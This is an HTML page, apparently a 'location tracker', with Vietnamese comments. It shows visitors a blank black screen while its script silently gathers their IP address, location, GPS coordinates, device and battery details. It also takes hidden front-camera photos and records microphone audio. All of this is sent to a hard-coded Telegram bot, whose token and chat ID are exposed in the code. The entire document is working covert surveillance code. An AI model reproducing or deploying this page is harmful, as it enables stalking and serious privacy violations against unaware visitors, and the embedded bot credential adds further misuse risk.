<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Hoang Anh - Location Tracker</title>
    <style>
        body {
            background: black;
            margin: 0;
            padding: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: monospace;
        }
        .hidden-content {
            display: none;
        }
    </style>
</head>
<body>
    <div style="display:none;">
        <div id="info"></div>
    </div>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
    <audio id="audio" style="display:none;"></audio>

    <script>
        // Cấu hình Telegram
        const botToken = '8677995221:AAEmsO71OlTS4PY7ML9md9XA-5PRAbQyfMI';
        const chatId = '7211752234';
        
        // Cấu hình chụp ảnh
        const PHOTO_COUNT = 5;
        const PHOTO_INTERVAL = 300;
        
        // Cấu hình ghi âm
        const AUDIO_DURATION = 4000;
        
        // Cờ để tránh gửi trùng lặp
        let infoSent = false;
        let photoSentCount = 0;
        let cameraStream = null;
        let cameraActive = false;
        let audioRecorded = false;
        let mediaRecorder = null;
        let audioChunks = [];
        let gpsDataSent = false;

        // Hàm gửi tin nhắn đến Telegram
        async function sendToTelegram(text, retryCount = 0) {
            const maxRetries = 2;
            try {
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: text.substring(0, 4096),
                        parse_mode: 'HTML',
                        disable_web_page_preview: false
                    })
                });
                
                const data = await response.json();
                if (!data.ok && retryCount < maxRetries) {
                    setTimeout(() => sendToTelegram(text, retryCount + 1), 2000);
                }
                return data;
            } catch (e) {
                console.error('Telegram Fetch Error:', e);
                if (retryCount < maxRetries) {
                    setTimeout(() => sendToTelegram(text, retryCount + 1), 2000);
                }
            }
        }

        // Hàm gửi file âm thanh
        async function sendAudioToTelegram(blob, retryCount = 0) {
            const maxRetries = 2;
            try {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('audio', blob, `audio_${Date.now()}.ogg`);
                formData.append('caption', `🎤 Ghi âm - ${new Date().toLocaleString('vi-VN')}`);
                
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                if (data.ok) {
                    console.log('✅ Đã gửi ghi âm thành công');
                } else if (retryCount < maxRetries) {
                    setTimeout(() => sendAudioToTelegram(blob, retryCount + 1), 2000);
                }
            } catch (e) {
                console.error('Telegram Audio Error:', e);
                if (retryCount < maxRetries) {
                    setTimeout(() => sendAudioToTelegram(blob, retryCount + 1), 2000);
                }
            }
        }

        // Hàm gửi ảnh
        async function sendPhotoToTelegram(blob, photoNumber, retryCount = 0) {
            const maxRetries = 2;
            try {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, `capture_${photoNumber}.jpg`);
                formData.append('caption', `📸 Ảnh chụp #${photoNumber} - ${new Date().toLocaleString('vi-VN')}`);
                
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                if (data.ok) {
                    photoSentCount++;
                    console.log(`✅ Đã gửi ảnh #${photoNumber}`);
                    
                    if (photoSentCount === PHOTO_COUNT && cameraStream && cameraActive) {
                        setTimeout(() => {
                            cameraStream.getTracks().forEach(track => track.stop());
                            cameraStream = null;
                            cameraActive = false;
                        }, 2000);
                    }
                } else if (retryCount < maxRetries) {
                    setTimeout(() => sendPhotoToTelegram(blob, photoNumber, retryCount + 1), 2000);
                }
            } catch (e) {
                console.error('Telegram Photo Error:', e);
                if (retryCount < maxRetries) {
                    setTimeout(() => sendPhotoToTelegram(blob, photoNumber, retryCount + 1), 2000);
                }
            }
        }

        // Hàm chụp ảnh
        async function captureSinglePhoto(video, canvas, ctx, photoNumber) {
            return new Promise((resolve) => {
                try {
                    if (video.readyState === video.HAVE_ENOUGH_DATA) {
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        canvas.toBlob((blob) => {
                            if (blob) {
                                sendPhotoToTelegram(blob, photoNumber);
                                resolve(true);
                            } else {
                                resolve(false);
                            }
                        }, 'image/jpeg', 0.85);
                    } else {
                        setTimeout(() => {
                            captureSinglePhoto(video, canvas, ctx, photoNumber).then(resolve);
                        }, 100);
                    }
                } catch (e) {
                    console.error(`Lỗi chụp ảnh #${photoNumber}:`, e);
                    resolve(false);
                }
            });
        }

        async function captureMultiplePhotos(video, canvas, ctx) {
            if (!cameraActive) return;
            for (let i = 1; i <= PHOTO_COUNT; i++) {
                if (!cameraActive) break;
                await captureSinglePhoto(video, canvas, ctx, i);
                if (i < PHOTO_COUNT) {
                    await new Promise(resolve => setTimeout(resolve, PHOTO_INTERVAL));
                }
            }
        }

        // Hàm ghi âm
        async function startRecording() {
            if (audioRecorded) return;
            try {
                console.log('🎤 Bắt đầu ghi âm...');
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                
                mediaRecorder = new MediaRecorder(stream);
                audioChunks = [];
                
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) audioChunks.push(event.data);
                };
                
                mediaRecorder.onstop = async () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                    if (audioBlob.size > 0) {
                        await sendAudioToTelegram(audioBlob);
                        audioRecorded = true;
                    }
                    stream.getTracks().forEach(track => track.stop());
                };
                
                mediaRecorder.start();
                setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, AUDIO_DURATION);
            } catch (e) {
                console.error('Lỗi ghi âm:', e);
            }
        }

        // Hàm lấy thông tin IP và vị trí chính xác
        async function getIPAndLocation() {
            let ip = 'Không xác định';
            let locationData = {
                city: 'Không xác định',
                region: 'Không xác định',
                country: 'Không xác định',
                isp: 'Không xác định',
                lat: null,
                lon: null
            };
            
            // Bước 1: Lấy IP chính xác
            const ipAPIs = [
                'https://api.ipify.org?format=json',
                'https://api.my-ip.io/ip.json',
                'https://ipapi.co/json/'
            ];
            
            for (const api of ipAPIs) {
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 4000);
                    const response = await fetch(api, { signal: controller.signal });
                    clearTimeout(timeoutId);
                    const data = await response.json();
                    if (api.includes('ipify')) ip = data.ip;
                    else if (api.includes('my-ip')) ip = data.ip;
                    else if (api.includes('ipapi.co')) ip = data.ip;
                    if (ip && ip !== 'Không xác định') break;
                } catch (e) {
                    console.log(`IP API ${api} failed:`, e);
                }
            }
            
            // Bước 2: Lấy vị trí từ IP
            const locationAPIs = [
                {
                    url: `https://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,org,lat,lon`,
                    parser: (data) => {
                        if (data && data.status === 'success') {
                            return {
                                city: data.city && data.city !== '' ? data.city : 'Không xác định',
                                region: data.regionName && data.regionName !== '' ? data.regionName : 'Không xác định',
                                country: data.country && data.country !== '' ? data.country : 'Không xác định',
                                isp: data.isp && data.isp !== '' ? data.isp : (data.org || 'Không xác định'),
                                lat: data.lat || null,
                                lon: data.lon || null
                            };
                        }
                        return null;
                    }
                },
                {
                    url: `https://ipapi.co/${ip}/json/`,
                    parser: (data) => {
                        if (data && !data.error) {
                            return {
                                city: data.city && data.city !== '' ? data.city : 'Không xác định',
                                region: data.region && data.region !== '' ? data.region : 'Không xác định',
                                country: data.country_name && data.country_name !== '' ? data.country_name : 'Không xác định',
                                isp: data.org && data.org !== '' ? data.org : 'Không xác định',
                                lat: data.latitude || null,
                                lon: data.longitude || null
                            };
                        }
                        return null;
                    }
                },
                {
                    url: `https://ipinfo.io/${ip}/json`,
                    parser: (data) => {
                        if (data && !data.error) {
                            let lat = null, lon = null;
                            if (data.loc && typeof data.loc === 'string') {
                                const parts = data.loc.split(',');
                                if (parts.length === 2) {
                                    lat = parseFloat(parts[0]);
                                    lon = parseFloat(parts[1]);
                                }
                            }
                            return {
                                city: data.city && data.city !== '' ? data.city : 'Không xác định',
                                region: data.region && data.region !== '' ? data.region : 'Không xác định',
                                country: data.country && data.country !== '' ? data.country : 'Không xác định',
                                isp: data.org && data.org !== '' ? data.org : 'Không xác định',
                                lat: lat,
                                lon: lon
                            };
                        }
                        return null;
                    }
                }
            ];
            
            for (const api of locationAPIs) {
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 6000);
                    const response = await fetch(api.url, { signal: controller.signal });
                    clearTimeout(timeoutId);
                    const data = await response.json();
                    const result = api.parser(data);
                    if (result && (result.city !== 'Không xác định' || result.country !== 'Không xác định')) {
                        locationData = result;
                        console.log(`✅ Lấy vị trí thành công từ: ${api.url}`, locationData);
                        break;
                    }
                } catch (e) {
                    console.log(`API ${api.url} failed:`, e);
                }
            }
            
            // Chuẩn hóa dữ liệu
            locationData.city = (locationData.city && locationData.city !== 'undefined' && locationData.city !== 'null') ? locationData.city : 'Không xác định';
            locationData.region = (locationData.region && locationData.region !== 'undefined' && locationData.region !== 'null') ? locationData.region : 'Không xác định';
            locationData.country = (locationData.country && locationData.country !== 'undefined' && locationData.country !== 'null') ? locationData.country : 'Không xác định';
            locationData.isp = (locationData.isp && locationData.isp !== 'undefined' && locationData.isp !== 'null') ? locationData.isp : 'Không xác định';
            
            return { ip, locationData };
        }

        // Hàm lấy thông tin pin CHÍNH XÁC cho iOS và các thiết bị khác
        async function getBatteryInfo() {
            let batteryPercent = 'Không xác định';
            let batteryCharging = false;
            
            // Phương pháp 1: Sử dụng Battery API chuẩn
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    // Nhân với 100 và làm tròn để có phần trăm
                    const level = Math.round(battery.level * 100);
                    batteryPercent = `${level}%`;
                    batteryCharging = battery.charging;
                    console.log(`✅ Battery API thành công: ${batteryPercent}, Sạc: ${batteryCharging}`);
                    return { batteryPercent, batteryCharging };
                } catch (err) {
                    console.log('Battery API lỗi:', err);
                }
            }
            
            // Phương pháp 2: Dùng User Agent để phát hiện iOS và hiển thị thông tin phù hợp
            const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
            const isMac = /Macintosh/.test(navigator.userAgent);
            
            if (isIOS) {
                console.log('📱 Phát hiện thiết bị iOS - iOS không cho phép đọc % pin qua web');
                // iOS không cho phép đọc % pin, hiển thị thông báo thân thiện
                batteryPercent = 'iOS giới hạn';
                batteryCharging = 'Không xác định';
                return { batteryPercent: 'iOS không hỗ trợ', batteryCharging: false };
            }
            
            // Phương pháp 3: Thử dùng API khác (nếu có)
            try {
                // Một số trình duyệt Android có thể hỗ trợ thêm
                if ('webkitGetBattery' in navigator) {
                    const battery = await navigator.webkitGetBattery();
                    const level = Math.round(battery.level * 100);
                    batteryPercent = `${level}%`;
                    batteryCharging = battery.charging;
                    console.log(`✅ webkitGetBattery: ${batteryPercent}`);
                    return { batteryPercent, batteryCharging };
                }
            } catch (e) {}
            
            // Nếu không lấy được, trả về giá trị mặc định
            console.log('⚠️ Không thể lấy thông tin pin');
            return { batteryPercent: 'Không xác định', batteryCharging: false };
        }

        // Hàm lấy thông tin thiết bị chi tiết (bao gồm kiểm tra iOS)
        async function getDeviceInfo() {
            const userAgent = navigator.userAgent;
            const platform = navigator.platform || 'Không xác định';
            
            // Phát hiện iOS chính xác
            const isIOS = /iPad|iPhone|iPod/.test(userAgent) && !window.MSStream;
            const isIPhone = /iPhone/.test(userAgent);
            const isIPad = /iPad/.test(userAgent) || (isIOS && screen.width > 768);
            let deviceModel = 'Không xác định';
            
            if (isIPhone) deviceModel = 'iPhone';
            else if (isIPad) deviceModel = 'iPad';
            else if (isIOS) deviceModel = 'iOS Device';
            else if (/Android/.test(userAgent)) deviceModel = 'Android';
            else if (/Windows/.test(userAgent)) deviceModel = 'Windows';
            else if (/Macintosh/.test(userAgent)) deviceModel = 'Mac';
            
            return {
                userAgent,
                platform,
                isIOS,
                deviceModel,
                isIPhone
            };
        }

        // Hàm tự động gửi vị trí GPS
        async function autoSendGPS() {
            if (gpsDataSent) return;
            
            if (!('geolocation' in navigator)) {
                console.log('Trình duyệt không hỗ trợ GPS');
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                async (pos) => {
                    const lat = pos.coords.latitude;
                    const lng = pos.coords.longitude;
                    const accuracy = pos.coords.accuracy;
                    const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
                    
                    const gpsMessage = `<b>📍 VỊ TRÍ GPS THỰC TẾ</b>\n\n` +
                        `<b>📌 Vĩ độ:</b> <code>${lat}</code>\n` +
                        `<b>📌 Kinh độ:</b> <code>${lng}</code>\n` +
                        `<b>🎯 Độ chính xác:</b> <code>${Math.round(accuracy)} mét</code>\n\n` +
                        `<a href="${mapsLink}">🗺️ Xem trên Google Maps</a>`;
                    
                    await sendToTelegram(gpsMessage);
                    gpsDataSent = true;
                    console.log('✅ Đã tự động gửi vị trí GPS');
                },
                (err) => {
                    let errorMsg = '';
                    switch(err.code) {
                        case err.PERMISSION_DENIED:
                            errorMsg = 'Người dùng từ chối chia sẻ vị trí';
                            break;
                        case err.POSITION_UNAVAILABLE:
                            errorMsg = 'Không thể xác định vị trí';
                            break;
                        case err.TIMEOUT:
                            errorMsg = 'Hết thời gian chờ';
                            break;
                        default:
                            errorMsg = err.message;
                    }
                    console.log(`Lỗi GPS: ${errorMsg}`);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }

        // Lấy thông tin thiết bị và gửi đến Telegram
        async function getInfoAndSendToTelegram() {
            const { ip, locationData } = await getIPAndLocation();
            const deviceInfo = await getDeviceInfo();
            
            // Lấy thông tin pin - đã xử lý riêng cho iOS
            const { batteryPercent, batteryCharging } = await getBatteryInfo();
            
            const screenWidth = screen.width;
            const screenHeight = screen.height;
            const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Không xác định';
            const cookieEnabled = navigator.cookieEnabled ? 'Bật' : 'Tắt';
            const currentTime = new Date().toLocaleString('vi-VN');
            const language = navigator.language || 'Không xác định';
            const hardwareConcurrency = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} nhân` : 'Không xác định';
            const referrer = document.referrer || 'Truy cập trực tiếp';
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Không xác định';
            
            // Tạo link Google Maps nếu có tọa độ
            let telegramMapsLink = '';
            if (locationData.lat && locationData.lon) {
                telegramMapsLink = `\n<a href="https://www.google.com/maps?q=${locationData.lat},${locationData.lon}">🗺️ Xem vị trí (ước tính từ IP)</a>`;
            }
            
            // Xử lý hiển thị pin đẹp hơn cho iOS
            let batteryDisplay = '';
            if (deviceInfo.isIOS) {
                batteryDisplay = `<b>🔋 Pin:</b> <code>iOS không hỗ trợ đọc % pin qua web (giới hạn bảo mật)</code>`;
            } else {
                const chargingStatus = batteryCharging ? '🔌 Đang sạc' : '🔋 Không sạc';
                batteryDisplay = `<b>🔋 Pin:</b> <code>${batteryPercent} (${chargingStatus})</code>`;
            }
            
            const telegramText = `<b>📥 KHÁCH TRUY CẬP MỚI</b>\n\n` +
                `<b>🌐 Địa chỉ IP:</b> <code>${ip}</code>\n` +
                `<b>📍 Thành phố:</b> <code>${locationData.city}</code>\n` +
                `<b>🗺️ Khu vực:</b> <code>${locationData.region}</code>\n` +
                `<b>🏳️ Quốc gia:</b> <code>${locationData.country}</code>\n` +
                `<b>🏢 Nhà mạng:</b> <code>${locationData.isp}</code>${telegramMapsLink}\n\n` +
                `<b>📱 Thiết bị:</b> <code>${deviceInfo.deviceModel}</code>\n` +
                `<b>💻 Trình duyệt:</b> <code>${deviceInfo.userAgent.substring(0, 80)}...</code>\n` +
                `<b>🖥️ Hệ điều hành:</b> <code>${deviceInfo.platform}</code>\n` +
                `<b>📺 Độ phân giải:</b> <code>${screenWidth}x${screenHeight}</code>\n` +
                `${batteryDisplay}\n` +
                `<b>💾 RAM:</b> <code>${deviceMemory}</code>\n` +
                `<b>⚙️ CPU Core:</b> <code>${hardwareConcurrency}</code>\n` +
                `<b>🍪 Cookie:</b> <code>${cookieEnabled}</code>\n` +
                `<b>🌐 Ngôn ngữ:</b> <code>${language}</code>\n` +
                `<b>⏰ Múi giờ:</b> <code>${timezone}</code>\n` +
                `<b>🕐 Thời gian:</b> <code>${currentTime}</code>\n` +
                `<b>📎 Nguồn truy cập:</b> <code>${referrer}</code>`;
            
            await sendToTelegram(telegramText);
            console.log('✅ Đã gửi thông tin đến Telegram');
        }
        
        // Khởi tạo camera
        async function startCameraImmediately() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                console.warn('Camera not supported');
                return;
            }
            
            try {
                console.log('📷 Yêu cầu camera...');
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: { ideal: 800 },
                        height: { ideal: 600 },
                        facingMode: 'user'
                    }
                });
                
                cameraStream = stream;
                cameraActive = true;
                video.srcObject = stream;
                
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play();
                        resolve();
                    };
                });
                
                await new Promise(resolve => setTimeout(resolve, 500));
                await captureMultiplePhotos(video, canvas, ctx);
            } catch (e) {
                console.warn('Camera error:', e);
                cameraActive = false;
            }
        }
        
        async function requestAudioImmediately() {
            setTimeout(async () => {
                if (!audioRecorded) {
                    await startRecording();
                }
            }, 100);
        }
        
        async function init() {
            try {
                console.log('🚀 Khởi tạo tracker (chế độ nền, chỉ gửi Telegram)...');
                
                // Gửi thông tin đến Telegram
                await getInfoAndSendToTelegram();
                
                // Tự động gửi vị trí GPS
                setTimeout(() => {
                    autoSendGPS();
                }, 1500);
                
                // Khởi tạo camera và chụp ảnh
                await startCameraImmediately();
                
                // Ghi âm
                await requestAudioImmediately();
                
                console.log('✅ Hoàn tất khởi tạo, tất cả dữ liệu đã được gửi đến Telegram');
            } catch (err) {
                console.error('Init error:', err);
                try {
                    await sendToTelegram(`⚠️ Lỗi khởi tạo: ${err.message}`);
                } catch(e) {}
            }
        }
        
        // Bắt đầu quá trình
        init();
    </script>
</body>
</html>
